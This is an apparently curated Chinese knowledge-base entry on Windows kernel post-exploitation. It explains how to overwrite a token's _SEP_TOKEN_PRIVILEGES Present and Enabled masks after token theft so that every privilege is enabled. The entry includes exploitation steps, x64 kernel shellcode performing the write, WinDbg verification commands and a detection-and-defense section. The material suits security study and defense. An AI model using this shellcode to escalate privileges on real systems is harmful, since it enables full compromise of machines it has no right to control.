---
id: binary-pwn-kernel-windows-sep-token-privileges-enable-all
title: 窃取 System Token 后开启全部特权：直接覆写 _SEP_TOKEN_PRIVILEGES 的 Present/Enabled 掩码
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-sep-token-privileges-mask-enable-all
aliases:
- _SEP_TOKEN_PRIVILEGES
- Token+0x40 Present Enabled
- 开启全部特权
- whoami /priv 全启用
- Token 特权掩码覆写
- SeDebugPrivilege 启用
tags:
- windows
- kernel
- pwn
- token
- privileges
- sep-token-privileges
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:35:44+08:00'
  notes: 已对照原文及截图核对：_SEP_TOKEN_PRIVILEGES 位于 Token+0x40（Present +0x40/Enabled +0x48/EnabledByDefault +0x50）、eq 0xffffb106 ecc96060+0x48 把 Present 写入 Enabled、System Token Present=0x4d45545359532abc 同时写 +0x40/+0x48 后 whoami /priv 全启用、shellcode mov [rcx+0x40]/[rcx+0x48],rbx 均与原文一致。WinDbg 地址串按原文转写（原文图片地址略有出入，非技术错误）。未复跑。
---

## 一句话结论

替换成 System Token 后，很多特权仍停留在「存在但未启用」（谁用 `whoami /priv` 都看到一串已禁用）；直接在内核内存里把 `_SEP_TOKEN_PRIVILEGES` 的 `Present` 掩码复制到 `Enabled`，或用 System Token 的 `Present` 同时覆写当前 Token 的 `Present` 与 `Enabled`，即可让进程拥有并启用全部特权。

## 原理

- **特权检查读的是什么**：Windows 的 `SeSinglePrivilegeCheck`/`SePrivilegeCheck` 最终检查 `TOKEN.Privileges.Enabled` 对应比特位；`_SEP_TOKEN_PRIVILEGES` 结构在案例构建中位于 Token 对象偏移 `+0x40`，布局为 `Present`（+0x40，拥有哪些特权）、`Enabled`（+0x48，当前启用哪些）、`EnabledByDefault`（+0x50）三个 64 位掩码。
- **Token 地址需要对齐**：`EPROCESS.Token` 是 `_EX_FAST_REF`，低 3 位是引用计数，指向 `_SEP_TOKEN_PRIVILEGES` 前必须 `& ~0xF`（案例用 `0xFFFFFFFFFFFFFFF0` 清低 4 位）得到 Token 对象基址，否则会读到错误偏移。
- **为什么替换 Token 后特权仍不全**：System Token 的 `Present` 掩码虽然覆盖绝大多数特权，但 `Enabled` 里通常只有少量位被置 1；依赖特权的操作（加载驱动、调试进程、备份文件等）会因为对应位未启用而失败。
- **两条路径**：
  1. 只启用「本来就有」的特权：`Enabled = Present`（把当前 Token 的 Present 值写到 +0x48），适合普通用户进程提权后立刻获得其拥有特权的全部能力。
  2. 获得全部特权并启用：取 System Token 的 `Present`，同时写到当前 Token 的 `Present` 和 `Enabled`（+0x40 与 +0x48），使当前令牌拥有 System 的全部特权且全部启用。
- **为什么能直接写**：这些是令牌对象中的普通数据字段，不走 `AdjustTokenPrivileges` 的权限校验；只要能在 ring0 写内存（shellcode、任意内核写），就能绕过「只有持有 `SeTcbPrivilege` 等才能授予特权」的用户态限制。
- **验证方式**：WinDbg 中用 `!token <Token & ~0xF>` 查看令牌，`dt !_sep_token_privileges <Token+0x40>` 查看三个掩码；用户态 `whoami /priv` 观察每个特权状态是否变为「已启用」。

## 触发条件

- 已获得 ring0 代码执行或任意内核写，并且已定位当前进程 Token（例如通过 Token 窃取 shellcode 或 BYOVD 任意读写）。
- 目标构建的 `_SEP_TOKEN_PRIVILEGES` 偏移已知（案例为 Token+0x40/+0x48/+0x50，Windows 10 19045.2006）；不同版本需重新确认。
- 进程的 Token 指针已指向 System Token（或至少拥有目标特权），否则只改 `Enabled` 无法获得 `Present` 中不存在的特权。
- 部分特权即使掩码置位仍会受其它策略约束（如 UAC、受保护进程、凭据保护），掩码覆写解决的是令牌层检查。

## 利用步骤

1. 通过 Token 窃取拿到当前进程 EPROCESS 与 Token 指针，或从用户态任意读得到 Token 地址。
2. 对齐 Token 地址：`token_obj = token_fast_ref & ~0xF`。
3. 取 System Token 的 `Present`：`system_present = *(u64 *)(system_token_obj + 0x40)`。
4. 写当前 Token：`*(u64 *)(token_obj + 0x40) = system_present; *(u64 *)(token_obj + 0x48) = system_present;`（可选再写 `+0x50` EnabledByDefault）。
5. 若只想启用已有特权，可只写 `+0x48 = *(u64 *)(token_obj + 0x40)`。
6. 运行 `whoami /priv`，应看到全部特权「已启用」；随后可加载驱动、调试进程、备份文件等。
7. 在调试环境中可用 `eq <token+0x40+8> <present 值>` 直接验证掩码变化。

## PoC

内核 shellcode 片段（接在 Token 窃取之后；偏移为案例构建值）：

```nasm
    ; r8 = System 的 ActiveProcessLinks 指针，r9 = 当前 EPROCESS
    mov rdx, [r8 + 0x70]        ; System Token（= EPROCESS+0x4B8）
    and rdx, 0xFFFFFFFFFFFFFFF0 ; 清引用计数，得到 Token 对象
    mov rbx, [rdx + 0x40]       ; System Token 的 Present 掩码
    mov rcx, [r9 + 0x4B8]       ; 当前 EPROCESS 的 Token
    and rcx, 0xFFFFFFFFFFFFFFF0 ; 对齐当前 Token 对象
    mov [rcx + 0x40], rbx       ; Present  = System Present
    mov [rcx + 0x48], rbx       ; Enabled  = System Present
```

WinDbg 验证命令（案例）：

```text
!token 0xffffb106ecc96060            ; 查看令牌（地址已按 0x10 对齐）
dt !_sep_token_privileges 0xffffb106ecc96060+0x40
eq 0xffffb106ecc96060+0x48 <present 值>   ; 仅启用已有特权
```

案例中操作后 `whoami /priv` 从大片「已禁用」变为全部「已启用」；未在本机复跑，偏移必须按目标 build 校正。

## 变体与关联

- 关联：[[binary-pwn-kernel-windows-shellcode-token-steal-eprocess]]（先完成 Token 替换）。
- 关联：[[binary-pwn-kernel-windows-smep-bypass-cr4-rop]]、[[binary-pwn-kernel-windows-kvas-nonpaged-pool-executable-shellcode-rop]]（两种 shellcode 执行入口）。
- 关联：[[pentest-privilege-escalation-byovd-rtcore64-arbitrary-rw-token-steal]]（用户态任意读写改 Token，可同样追加特权掩码覆写）。
- 变体：只启用特定特权（如 `SeDebugPrivilege`、`SeLoadDriverPrivilege`），把对应比特位单独置 1，降低对令牌的改动面。
- 变体：用户态拿到 `SeTcbPrivilege`/`SeAssignPrimaryTokenPrivilege` 后走 `AdjustTokenPrivileges` 正常路径；掩码覆写适用于没有相应权限但已有内核写的场景。
- 边界：修改共享 Token（如 System Token）会影响所有引用该令牌的进程，可能造成系统行为异常；`EnabledByDefault`、`PrivilegeCount` 等字段与掩码需保持自洽；EDR 可能对令牌字段写做告警。

## 检测与防御

- 检测：监控令牌 `Present/Enabled` 掩码被异常改为全 1（尤其普通进程拥有 System 全部特权）、`whoami /priv` 全部启用、进程突然获得 `SeLoadDriverPrivilege`/`SeDebugPrivilege` 等高价值特权。
- 内核侧：EDR 令牌回调、内核完整性/代码完整性策略；HVCI 不保护数据字段，需结合行为检测。
- 减排：消除内核写原语是根本；限制普通用户触达漏洞驱动与设备；及时修补提权漏洞。
- 应急：发现异常令牌时终止进程、隔离主机、排查内核写来源（驱动、IOCTL、池溢出）并轮换凭据。
